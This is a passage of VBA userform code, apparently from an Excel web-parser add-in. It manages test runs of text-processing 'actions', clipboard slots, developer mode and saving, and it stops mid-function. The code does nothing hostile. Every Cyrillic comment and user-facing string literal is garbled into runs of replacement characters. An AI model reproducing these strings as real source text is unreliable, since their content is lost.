Private Sub Label_DevModeEnable_Click()
    On Error Resume Next: SETT.SetText "DeveloperMode", True: DeveloperModeChanged: Label_DevModeEnable.Visible = False
End Sub

Private Sub Label_OnlineManual_Click()
    On Error Resume Next
    FollowHyperlink "http://excelvba.ru/programmes/Parser/actions/" & Me.Label_OnlineManual.Tag
End Sub

Private Sub Label_OpenWithBrowser_Click()
    On Error Resume Next: ShowTextInBrowser Me.TextBox_TestDestination.text
End Sub
Private Sub Label_OpenWithBrowser2_Click()
    On Error Resume Next: ShowTextInBrowser Me.TextBox_TestDestination2.text
End Sub

Private Sub Label_OpenWithBrowser_XML_Click()
    On Error Resume Next: ShowTextInBrowser Me.TextBox_TestDestination.text, , True
End Sub
Private Sub Label_OpenWithBrowser_XML2_Click()
    On Error Resume Next: ShowTextInBrowser Me.TextBox_TestDestination2.text, , True
End Sub

Private Sub Label_OpenWithNotepad_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    OpenWithNotepad Me.TextBox_TestDestination.text, Button = 2
End Sub
Private Sub Label_OpenWithNotepad2_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    OpenWithNotepad Me.TextBox_TestDestination2.text, Button = 2
End Sub

Sub OpenWithNotepad(ByVal txt$, Optional ReplaceSeparators As Boolean = False)
    On Error Resume Next: Err.Clear: Randomize: Dim FileName$
    If ReplaceSeparators Then txt = Replace(txt, ARSEP, vbNewLine & String(30, "=") & "<array items separator>" & String(30, "=") & vbNewLine)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    FileName$ = Environ("TEMP") & "\test_actions_result_" & Left(Rnd() * 1E+15, 10) & ".txt"
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|
    With CreateObject("scripting.filesystemobject").CreateTextFile(FileName, True, True)
        .Write txt: .Close
    End With
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    CreateObject("wscript.shell").Run """" & FileName$ & """"
End Sub

Private Sub Label_TestDestinationMoveToTestSource_Click()
    On Error Resume Next
    With TestResultField
        If Len(.value) Then
            Me.TextBox_TestSource = .value: .value = ""
            Me.Label_Clipboard_Save.Visible = False: Me.Label_Clipboard_Save1.Visible = False
            Me.Label_Clipboard_Save.Enabled = True: Me.Label_Clipboard_Save1.Enabled = True
        End If
    End With
End Sub

Private Sub Label_TestResultField2_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    Me.ShowLongResult = Not Me.ShowLongResult
    Me.Label_TestResultField.ForeColor = IIf(Me.ShowLongResult, 12583104, 8388608)
    Me.Label_TestResultField.Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & IIf(Me.ShowLongResult, "(full text)", "")
    Me.Label_TestResultField2.ForeColor = IIf(Me.ShowLongResult, 12583104, 8388608)
    Me.Label_TestResultField2.Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & IIf(Me.ShowLongResult, "(full text)", "")
End Sub

Private Sub Label_TestSourceMoveToTestDestination_Click()
    On Error Resume Next
    With TestResultField
        If Len(Me.TextBox_TestSource) Then
            .value = Me.TextBox_TestSource: Me.TextBox_TestSource = ""
            Me.Label_Clipboard_Save.Visible = True: Me.Label_Clipboard_Save1.Visible = InStr(1, .value, ARSEP) > 0
            Me.Label_Clipboard_Save.Enabled = True: Me.Label_Clipboard_Save1.Enabled = True
        End If
    End With
End Sub

Private Sub ListBox_ArrayActions_Change()
    On Error Resume Next
    If StopEvents Then Exit Sub
    Set ActiveAction = Nothing
    Set ActiveAction = AAs.GetActionByIndex(Me.ListBox_ArrayActions.ListIndex + 1)
    Me.Frame_EditFunction.Visible = Me.ListBox_ArrayActions.ListIndex >= 0
    LoadActiveActionParameters
    'Me.CommandButton_SaveAAS_and_Close.Enabled = ActiveAAs.IsCorrect
End Sub

Sub LoadActiveActionParameters()
    On Error Resume Next
    If ActiveAction Is Nothing Then Exit Sub
    Me.Frame_EditFunction.Visible = True
    StopEvents = True
    
    ' If ActiveAction.CodeName <> DEFAULT_ACTION_NAME$ Then Me.ComboBox_ArrayActions = ActiveAction.CodeName
    Me.CheckBox_AA_Enabled = ActiveAction.Enabled
    Me.TextBox_ArrayActionName = ActiveAction.Name
    Me.TextBox_ArrayActionCodeName = ActiveAction.Codename
    Me.TextBox_ArrayActionName.ForeColor = IIf(ActiveAction.Enabled, vbButtonText, vbRed)
    Me.TextBox_Comment = ActiveAction.Comment
    
    Dim i&, param As ArrayActionParameter, CB As MSForms.ComboBox
    For i& = 1 To ActiveAction.parameters.Count
        Set param = ActiveAction.parameters(i)
        
        Set CB = Me.Controls("ComboBox_AA_Parameter" & i)
        With CB
            .text = param.DefaultValue
            .text = param.value
        End With
    Next
    Me.Frame_Actions.Visible = ActiveAction.parameters.Count > 0
    Me.TextBox_ActionDescription = ActiveAction.Description
    
    ShowActionComment (ActiveAction.Comment <> "") Or (Me.ToggleButton_ShowComment.value = True)
    
    'If ActiveAction.CodeName = DEFAULT_ACTION_NAME$ Then Me.ComboBox_ArrayActions = ""
    StopEvents = False
    'If Err Then MsgBox Err.Description, , Err.Number
End Sub

Function TestResultField() As MSForms.TextBox
    On Error Resume Next
    Set TestResultField = IIf(SETT.GetBoolean("ExtendedResultField", False), Me.TextBox_TestDestination2, Me.TextBox_TestDestination)
End Function

Sub TestActions()
    On Error Resume Next
    Dim txt$, arr, info$, StopAfterItem&
    Me.TextBox_TestDestination = ""
    Me.TextBox_TestDestination2 = ""
    Me.Label_TestResultInfo = info$
    Me.Label_TestResultInfo2 = info$
    
    txt = RenderConstants(Me.TextBox_TestSource)
    TEST_ACTIONS_MODE = True
    Select Case True
        Case Me.OptionButton_CalcUsingAllActions
            StopAfterItem& = 999: If Me.CheckBox_StopAfterSelectedItem Then StopAfterItem& = ActiveAction.Index
            AAs.GetActiveActions.ApplyTo txt, , True, StopAfterItem&
        Case Me.OptionButton_CalcUsingSelectedAction
            ActiveAction.ApplyTo txt
    End Select
    
    If Len(txt) Then
        Me.Label_Clipboard_Save.Visible = True: Me.Label_Clipboard_Save1.Visible = InStr(1, txt, ARSEP)
    Else
        Me.Label_Clipboard_Save.Visible = False: Me.Label_Clipboard_Save1.Visible = False
    End If
    Me.Label_Clipboard_Save.Enabled = True: Me.Label_Clipboard_Save1.Enabled = True
    
    With TestResultField
        If Me.CheckBox_ShowArraysAsRows Then
            .value = Replace(txt, ARSEP, vbLf)
        Else
            If (Len(txt) > 2000000) And (Not Me.ShowLongResult) Then
                .value = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & FWF.FileOrFolderSize(Len(txt)) & vbNewLine & _
                    "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 100.000 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|):" & vbNewLine & vbNewLine & _
                    Left(txt, 100000) & vbNewLine & vbNewLine & " ... |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| ... " & vbNewLine & vbNewLine & Right(txt, 100000)
            Else
                .value = txt
            End If
        End If
        .SetFocus
        .SelStart = 0
        '        .SelLength = 0
    End With
    LastTestActionsResult$ = ""
    LastTestActionsResult$ = Split(txt, ARSEP)(0)
    
    
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|  Label_TestResultInfo
    If txt = "" Then
        info$ = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Else
        arr = Split(txt, ARSEP)
        If UBound(arr) > 0 Then        ' |fffd||fffd||fffd||fffd||fffd||fffd|
            info$ = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| " & UBound(arr) + 1 & " |fffd||fffd||fffd||fffd|."
        Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            info$ = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & Len(txt) & " |fffd||fffd||fffd||fffd|."
        End If
    End If
    Me.Label_TestResultInfo = info$
    Me.Label_TestResultInfo2 = info$
    Me.TextBox_TestDestination.ScrollBars = fmScrollBarsVertical
    TEST_ACTIONS_MODE = False
End Sub


Private Sub ListBox_ClipboardActions_Click()
    On Error Resume Next
    Set ClipboardActiveAction = Nothing
    Set ClipboardActiveAction = ClipboardAAs.GetActionByIndex(Me.ListBox_ClipboardActions.ListIndex + 1)
End Sub

Private Sub OptionButton_CalcUsingAllActions_Click()
    Me.CommandButton_GetDuration.Enabled = False
End Sub

Private Sub OptionButton_CalcUsingSelectedAction_Click()
    Me.CommandButton_GetDuration.Enabled = True
End Sub

Private Sub TextBox_ArrayActionCodeName_Change()
    On Error Resume Next: Err.Clear
    Dim FunctionCodeName$, res As Boolean, i&, param As ArrayActionParameter, CB As MSForms.ComboBox, cnt&
    
    FunctionCodeName$ = Trim(Me.TextBox_ArrayActionCodeName.value)
    Err.Clear
    If FunctionCodeName$ = "" Then
        ActiveAction.ClearParameters
        Exit Sub
    End If
    
    'MsgBox ActiveAction.GetParametersInfo, , "before ComboBox_ArrayActions_Change"
    res = ActiveAction.LoadParameters(FunctionCodeName$)
    Me.TextBox_ArrayActionName = ActiveAction.Name
    'ActiveAction.Enabled = res
    
    ' Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & FunctionCodeName$ & _
        "|fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & res & ", Enabled = " & ActiveAction.Enabled
    Me.Label_AAP.Visible = 1    'res
    Me.CommandButton_ShowActionDescription.Visible = 1    'res
    
    Me.Label_OnlineManual.Tag = ActiveAction.Codename
    'Me.Label_OnlineManual.Visible = ActiveAction.HasManual
    
    StopEvents = True
    For i& = 1 To 8
        With Me.Controls("ComboBox_AA_Parameter" & i)
            .Visible = False
            .Clear
        End With
        Me.Controls("Label_ParamDescr" & i).Visible = False
    Next
    
    For i& = 1 To ActiveAction.parameters.Count
        Set param = ActiveAction.parameters(i)
        
        Set CB = Me.Controls("ComboBox_AA_Parameter" & i)
        param.ApplyToCombobox CB, Me.AAs.ParentParser, Me.AAs
        
        With Me.Controls("Label_ParamDescr" & i)
            .Visible = True
            .Caption = param.Description
        End With
    Next
    
    cnt& = ActiveAction.parameters.Count
    Me.Frame_Actions.ScrollHeight = IIf(cnt& <= 4, FRAME_ACTIONS_HEIGHT_2_ROWS&, IIf(cnt& <= 6, FRAME_ACTIONS_HEIGHT_3_ROWS&, FRAME_ACTIONS_HEIGHT_4_ROWS&))
    Me.Frame_Actions.ScrollTop = 0
    
    StopEvents = False
    'MsgBox ActiveAction.GetParametersInfo, , "after ComboBox_ArrayActions_Change"
    
    Me.Label_AAP.Caption = IIf(ActiveAction.parameters.Count > 0, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:", "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
    Me.TextBox_ActionDescription = ActiveAction.Description
    'MsgBox ActiveAction.Parameters(1).Value, , ActiveAction.codename
    Fill_AAs_Values
    
    Me.CommandButton_CreateDuplicatesForActiveAction.Visible = _
        ((ActiveAction.Codename = "WinHTTP_AddPOSTdata") Or (ActiveAction.Codename = "WinHTTP_setRequestHeader"))
End Sub



Private Sub TextBox_Comment_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    ActiveAction.Comment = Me.TextBox_Comment.text
    Fill_AAs_Values
End Sub

Private Sub TextBox_TestDestination_Change()
    On Error Resume Next
    Dim HasResult As Boolean: HasResult = Trim(Me.TextBox_TestDestination.text) <> ""
    
    Me.Label_CopyIntoClipboard.Enabled = HasResult
    Me.Label_OpenWithNotepad.Enabled = HasResult
    Me.Label_OpenWithBrowser.Enabled = HasResult
    Me.Label_OpenWithBrowser_XML.Enabled = HasResult
End Sub

Private Sub TextBox_TestDestination2_Change()
    On Error Resume Next
    Dim HasResult As Boolean: HasResult = Trim(Me.TextBox_TestDestination2.text) <> ""
    
    Me.Label_CopyIntoClipboard2.Enabled = HasResult
    Me.Label_OpenWithNotepad2.Enabled = HasResult
    Me.Label_OpenWithBrowser2.Enabled = HasResult
    Me.Label_OpenWithBrowser_XML2.Enabled = HasResult
End Sub

Private Sub TextBox_TestSource_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    On Error Resume Next
    If Me.TextBox_TestSource = "" Then Me.TextBox_TestSource = LastTestActionsResult$
End Sub

Private Sub ToggleButton_Clipboard_Change()
    Dim ClipboardMode As Boolean: ClipboardMode = Me.ToggleButton_Clipboard.value
    Me.ToggleButton_Clipboard.Caption = IIf(ClipboardMode, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
    Me.MultiPage_Mode.value = IIf(ClipboardMode, 1, 0)
End Sub


Private Sub ToggleButton_KeepTestSourceText_Click()
    On Error Resume Next: If StopEvents Then Exit Sub
    If Me.ToggleButton_KeepTestSourceText.value Then
        SaveAddinClipboardValue "_SourceText", Me.TextBox_TestSource
    Else
        SaveAddinClipboardValue "_SourceText", ""
        Me.TextBox_TestSource = ""
    End If
End Sub

Private Sub ToggleButton_ShowComment_Click()
    If Me.StopEvents Then Exit Sub
    Me.ShowActionComment Me.ToggleButton_ShowComment.value
End Sub

Sub ShowActionComment(ByVal show_mode As Boolean)
    If show_mode Then
        Me.Frame_Actions.Height = FRAME_ACTIONS_HEIGHT_2_ROWS& ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    Else
        Me.Frame_Actions.Height = FRAME_ACTIONS_HEIGHT_3_ROWS&
    End If
End Sub

Private Sub ToggleButton_TestFiledSize_Click()
    On Error Resume Next: If Me.StopEvents Then Exit Sub
    SETT.SetText "ExtendedResultField", Me.ToggleButton_TestFiledSize
    ExtendTestFields
    If Me.ToggleButton_TestFiledSize Then
        Me.TextBox_TestDestination2 = Me.TextBox_TestDestination
    Else
        Me.TextBox_TestDestination = Me.TextBox_TestDestination2
    End If
End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next
    Dim i&, arr, ctrl As MSForms.Control, SC As SpecialControl, txt$
    Set AAs = New ArrayActions
    If Not ActiveAAs Is Nothing Then
        AAs.LoadFromXML ActiveAAs.ExportToXML        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ActiveAAs
    End If
    Set Me.AAs.ParentParser = ActiveAAs.ParentParser
    
    Set Me.ClipboardAAs = GetClipboard_AAs
    Fill_ClipboardAAs_Values
    
    DeveloperModeChanged
    Me.MultiPage_Mode.Style = fmTabStyleNone
    Me.MultiPage_Mode.value = 0
    
    'Set Me.ActiveAction = AAs.Items(AAs.Items.Count)
    Fill_AAs_Values
    Fill_SubMenu_Comboes
    ApplyZoomTo Me
    Me.ListBox_ArrayActions.ListIndex = Me.ListBox_ArrayActions.ListCount - 1
    
    ' special controls
    Set Me.SpecialControlsCollection = New Collection
    For Each ctrl In Me.Controls
        If TypeName(ctrl) = "ScrollBar" And ctrl.Tag = "ScrollCombo" Then
            Set SC = New SpecialControl: Set SC.Scroller = ctrl
            If SC.FieldFound Then Me.SpecialControlsCollection.Add SC
        End If
    Next
    
    StopEvents = True
    Me.ToggleButton_TestFiledSize = SETT.GetBoolean("ExtendedResultField", False)
    ExtendTestFields
    txt$ = GetAddinClipboardValue("_SourceText")
    Me.ToggleButton_KeepTestSourceText.value = txt$ <> ""
    If Len(txt) Then Me.TextBox_TestSource = txt$
    StopEvents = False
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd| Label_Clipboard
    Dim ClipboardArr, ValueIndex&
    ValueIndex& = Val(GetSetting(PROJECT_NAME$, "Clipboard", "CurrentIndex", 0))        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    If ValueIndex& Then
        ClipboardArr = Split(GetAddinClipboardValue(ValueIndex&), ARSEP)
        If UBound(ClipboardArr) >= 0 Then
            Me.Label_Clipboard_Get.Visible = True
            Me.Label_Clipboard_Get1.Visible = UBound(ClipboardArr) > 0
            Me.Label_Clipboard_GetNext.Visible = UBound(ClipboardArr) > 0
            
            With Me.Label_ClipboardIndex
                .Visible = True: .Tag = ValueIndex&: .Caption = ChrW(9311 + ValueIndex&)
            End With
            
            Me.Label_Clipboard_Get.Tag = UBound(ClipboardArr) + 1
            Me.Label_Clipboard_GetNext.Tag = 2
            Me.Label_Clipboard_GetNext.Caption = "Next (" & 2 & ")"
        End If
        Erase ClipboardArr
    End If
End Sub

Sub DeveloperModeChanged()
    On Error Resume Next: Dim DeveloperMode As Boolean: DeveloperMode = SETT.GetBoolean("DeveloperMode")
    Me.CommandButton_GetDuration.Visible = DeveloperMode
    Me.Frame_ClipboardTools.Visible = DeveloperMode
    Me.Frame_Export.Visible = DeveloperMode
    Me.Label_TestDestinationMoveToTestSource.Visible = DeveloperMode
    Me.Label_TestSourceMoveToTestDestination.Visible = DeveloperMode
    Me.Label_DevModeEnable.Visible = Not DeveloperMode
    Me.CommandButton_SaveIntoAddinStorage.Visible = TrueDeveloper
End Sub

Private Sub CommandButton_Cancel_Click(): Unload Me: End Sub
    
Private Sub CommandButton_OnlineHelp_Click(): OnlineHelp Me.CommandButton_OnlineHelp.Tag: End Sub
    
Sub CommandButton_SaveAAS_Click()
    On Error Resume Next
    If Me.CallerUF Is Nothing Then        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|
        Me.AAs.SaveAs "TestActionsForm"
    Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If Not Saved Then Me.Save: Me.Show
    End If
End Sub

Private Sub CommandButton_SaveAAS_and_Close_Click()
    On Error Resume Next
    Me.Save: Unload Me
End Sub

Function Saved() As Boolean
    On Error Resume Next
    If Me.CallerUF Is Nothing Then        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|
        Saved = Me.AAs.ExportToXML.XML = GetSetting(PROJECT_NAME$, "Clipboard", "TestActionsForm", "")
    Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Saved = ActiveAAs.ExportToXML.XML = Me.AAs.ExportToXML(, ActiveAAs.GetLevel).XML
    End If
End Function

Sub Save()
    On Error Resume Next
    Dim aa As ArrayAction
    For Each aa In AAs.Items
        If aa.Codename = DEFAULT_ACTION_NAME$ Then AAs.DeleteAction aa.Index
    Next
    Fill_AAs_Values
    
    If Me.CallerUF Is Nothing Then        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|
        Me.AAs.SaveAs "TestActionsForm"
    Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        ActiveAAs.LoadFromXML AAs.ExportToXML        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| AAs
        Me.CallerUF.Controls("Run_UpdateArrayActions").text = Val(Me.CallerUF.Controls("Run_UpdateArrayActions").text) + 1
    End If
End Sub

Sub SaveIntoAddinStorage()
    On Error Resume Next
    Dim aa As ArrayAction
    For Each aa In AAs.Items
        If aa.Codename = DEFAULT_ACTION_NAME$ Then AAs.DeleteAction aa.Index
    Next
    Fill_AAs_Values
    
    If Me.CallerUF Is Nothing Then        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|
        Me.AAs.SaveAs "TestActionsForm"
    End If
    
    With F_ActionSetEditor
        Set .SourceSheet = sh_actions
        .Initialize_2 AAs
        .Show
    End With
    
    Unload Me
End Sub

Sub Fill_AAs_Values()        'Optional ByVal DoNotScroll As Boolean = False
    On Error Resume Next: Err.Clear
    Dim TopIndex&: TopIndex& = Me.ListBox_ArrayActions.TopIndex
    StopEvents = True
    Me.ListBox_ArrayActions.list = AAs.ToArray(True)
    
    If Not ActiveAction Is Nothing Then Me.ListBox_ArrayActions.ListIndex = ActiveAction.Index - 1
    
    Dim ButtonsEnabled As Boolean: ButtonsEnabled = Me.ListBox_ArrayActions.ListIndex >= 0
    Me.CommandButton_CloneAction.Enabled = ButtonsEnabled
    Me.CommandButton_RemoveAction.Enabled = ButtonsEnabled
    Me.CommandButton_MoveUpAction.Enabled = ButtonsEnabled
    Me.CommandButton_MoveDownAction.Enabled = ButtonsEnabled
    
    Me.CommandButton_ToClipboard_CopySelected.Enabled = ButtonsEnabled
    Me.CommandButton_ToClipboard_MoveSelected.Enabled = ButtonsEnabled
    
    ButtonsEnabled = Me.ListBox_ArrayActions.ListCount > 0
    Me.CommandButton_ToClipboard_CopyAll.Enabled = ButtonsEnabled
    Me.CommandButton_ToClipboard_MoveAll.Enabled = ButtonsEnabled
    
    Me.ListBox_ArrayActions.TopIndex = TopIndex&
    StopEvents = False
End Sub

Sub Fill_ClipboardAAs_Values()
    On Error Resume Next: Err.Clear
    Me.ListBox_ClipboardActions.list = ClipboardAAs.ToArray
    
    If ClipboardActiveAction Is Nothing Then
        ' Set ClipboardActiveAction = ClipboardAAs.Items(1)
        Me.ListBox_ClipboardActions.ListIndex = 0
    Else
        Me.ListBox_ClipboardActions.ListIndex = ClipboardActiveAction.Index - 1
    End If
    
    Dim ButtonsEnabled As Boolean: ButtonsEnabled = Me.ListBox_ClipboardActions.ListIndex >= 0
    
    Me.CommandButton_Clipboard_RemoveAction.Enabled = ButtonsEnabled
    Me.CommandButton_Clipboard_Clear.Enabled = ButtonsEnabled
    Me.CommandButton_Clipboard_MoveUpAction.Enabled = ButtonsEnabled
    Me.CommandButton_Clipboard_MoveDownAction.Enabled = ButtonsEnabled
    
    Me.CommandButton_FromClipboard_CopySelected.Enabled = ButtonsEnabled
    Me.CommandButton_FromClipboard_MoveSelected.Enabled = ButtonsEnabled
    
    ButtonsEnabled = Me.ListBox_ClipboardActions.ListCount > 0
    Me.CommandButton_FromClipboard_CopyAll.Enabled = ButtonsEnabled
    Me.CommandButton_FromClipboard_MoveAll.Enabled = ButtonsEnabled
    
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    Dim msg$
    If (Not JumpToNextLevel) And (Not Saved) Then
        msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
        Select Case MsgBox(msg, vbQuestion + vbYesNoCancel + vbDefaultButton3, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
            Case vbYes
                Me.Save
            Case vbNo
                ' close unsaved
            Case vbCancel
                Cancel = True
                Exit Sub
        End Select
    End If
    
    Set Me.SpecialControlsCollection = Nothing
    If JumpToNextLevel Then
        If Me.ColumnMode Then
            RunWithDelay "EditNextColumn", 0.5        '  DelayedJumpToNextColumn
        Else
            RunWithDelay "EditNextActionsLevel", 0.5        '  DelayedJumpToNextLevel
        End If
    End If
End Sub

Private Sub UserForm_Terminate()
    On Error Resume Next
    Me.ClipboardAAs.SaveClipboard
End Sub

Sub SubMenuAction(ByVal command$, Optional ByRef field As MSForms.TextBox)
    On Error Resume Next: Dim ind&, NeedUpdateComboes As Boolean, v$, URL$
    With field
        Select Case True
            Case command$ Like "OpenInBrowser"
                ShowTextInBrowser .value
                
            Case command$ Like "OpenInBrowserAsXML"
                ShowTextInBrowser .value, , True
                
            Case command$ Like "OpenInNotepad"
                OpenWithNotepad .value, True
                
            Case command$ Like "ShowConstants"
                .value = ShowConstants(.value)
                .SelStart = 0: .SetFocus
                
            Case command$ Like "RenderConstants"
                .value = RenderConstants(.value)
                .SelStart = 0: .SetFocus
                
            Case command$ Like "ShowCookies"
                ShowInfo_CookiesListFromStore
                
            Case command$ Like "ShowRequestHeaders"
                MsgBox GetAllRequestHeadersFromStore, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| HTTP |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                
            Case command$ Like "Save Clipboard #*"
                ind& = Val(Split(command$, " Clipboard ")(1))
                If ind& Then SaveAddinClipboardValue ind&, .value: NeedUpdateComboes = True
                
            Case command$ Like "Get Clipboard #*"
                ind& = Val(Split(command$, " Clipboard ")(1))
                If ind& Then .value = LoadAddinClipboardValues.item(ind&)
                
            Case command$ Like "Clear Clipboard"
                DeleteAddinClipboardValues
                NeedUpdateComboes = True
                Me.Label_Clipboard_Save.Visible = Len(Me.TestResultField.text) > 0
                Me.Label_Clipboard_Save1.Visible = Len(Me.TestResultField.text) > 0
                Me.Label_Clipboard_Get.Visible = False: Me.Label_Clipboard_Get1.Visible = False
                Me.Label_Clipboard_GetNext.Visible = False: Me.Label_ClipboardIndex.Visible = False
                SaveSetting PROJECT_NAME$, "Clipboard", "CurrentIndex", 0
                
            Case command$ Like "GetFromActiveCell"
                .value = GetSourceValueFromActiveCell
                
            Case command$ Like "GetURLFromActiveCellAndLoadPage"
                .value = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                If ActiveCell.Hyperlinks.Count Then
                    URL$ = GetCellHyperlinkAddress(ActiveCell)
